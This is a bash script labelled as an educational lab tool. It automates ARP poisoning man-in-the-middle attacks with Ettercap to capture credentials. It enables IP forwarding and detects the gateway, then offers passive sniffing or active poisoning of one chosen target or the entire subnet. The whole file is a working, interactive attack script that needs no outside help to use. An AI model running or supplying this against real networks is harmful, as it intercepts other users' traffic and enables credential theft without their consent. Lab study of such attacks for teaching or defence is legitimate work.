#!/bin/bash
###############################################################################
# Script Name: ettercap-arp-poisoning.sh
# Description: ARP Poisoning attack with credential capture using Ettercap
# Author: Preeti Deepak Soni
# Purpose: Educational - Lab Environment Only
# Usage: sudo ./ettercap-arp-poisoning.sh
###############################################################################

# Color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Print banner
echo -e "${BLUE}"
echo "============================================================"
echo "   Ettercap ARP Poisoning Lab - Credential Capture"
echo "   Educational Purpose Only - Authorized Testing"
echo "============================================================"
echo -e "${NC}"

# Check if running as root
if [ "$EUID" -ne 0 ]; then
    echo -e "${RED}[!] This script must be run as root${NC}"
    echo "    Usage: sudo ./ettercap-arp-poisoning.sh"
    exit 1
fi

# Configuration
INTERFACE="wlp5s0"
TARGET_IP=""
GATEWAY_IP=""

# Display network configuration
echo -e "${YELLOW}[*] Current network configuration:${NC}"
ip a show $INTERFACE 2>/dev/null

# Get gateway
GATEWAY_IP=$(ip route | grep default | awk '{print $3}' | head -1)
echo -e "${BLUE}[*] Default gateway: $GATEWAY_IP${NC}"

# Verify Ettercap is installed
if ! command -v ettercap &> /dev/null; then
    echo -e "${RED}[!] Ettercap is not installed${NC}"
    echo "    Install with: sudo apt install ettercap-text-only ettercap-graphical"
    exit 1
fi

echo -e "${GREEN}[+] Ettercap is installed${NC}"

# Display Ettercap version
ettercap -v

# Enable IP forwarding
echo -e "${YELLOW}[*] Enabling IP forwarding...${NC}"
echo 1 > /proc/sys/net/ipv4/ip_forward
echo -e "${GREEN}[+] IP forwarding enabled${NC}"

# Display attack options
echo -e "${BLUE}"
echo "============================================================"
echo "   Available Ettercap Attack Modes:"
echo "============================================================"
echo "   1. Text mode with sniffing (passive)"
echo "   2. Text mode with ARP poisoning (active)"
echo "   3. GUI mode (graphical interface)"
echo "   4. Daemon mode"
echo "============================================================"
echo -e "${NC}"

read -p "Select attack mode [1-4]: " MODE

case $MODE in
    1)
        echo -e "${YELLOW}[*] Starting Ettercap in text mode (passive sniffing)...${NC}"
        echo -e "${BLUE}    Command: ettercap -T -q -i $INTERFACE${NC}"
        ettercap -T -q -i $INTERFACE
        ;;
    2)
        echo -e "${YELLOW}[*] Enter target IP (or press Enter for entire subnet):${NC}"
        read -p "Target IP: " TARGET_IP

        if [ -z "$TARGET_IP" ]; then
            echo -e "${BLUE}[*] Performing ARP poisoning on entire subnet...${NC}"
            echo -e "${BLUE}    Command: ettercap -T -q -M arp:remote -i $INTERFACE${NC}"
            ettercap -T -q -M arp:remote -i $INTERFACE
        else
            echo -e "${BLUE}[*] Targeting $TARGET_IP and gateway $GATEWAY_IP${NC}"
            echo -e "${BLUE}    Command: ettercap -T -q -M arp:remote /$TARGET_IP// /$GATEWAY_IP// -i $INTERFACE${NC}"
            ettercap -T -q -M arp:remote /$TARGET_IP// /$GATEWAY_IP// -i $INTERFACE
        fi
        ;;
    3)
        echo -e "${YELLOW}[*] Starting Ettercap in GUI mode...${NC}"
        ettercap -G
        ;;
    4)
        echo -e "${YELLOW}[*] Starting Ettercap in daemon mode...${NC}"
        ettercap -D -i $INTERFACE
        ;;
    *)
        echo -e "${RED}[!] Invalid option${NC}"
        exit 1
        ;;
esac

# Cleanup
echo -e "${YELLOW}[*] Cleaning up...${NC}"
echo 0 > /proc/sys/net/ipv4/ip_forward
echo -e "${GREEN}[+] IP forwarding disabled${NC}"
echo -e "${GREEN}[+] Cleanup complete${NC}"
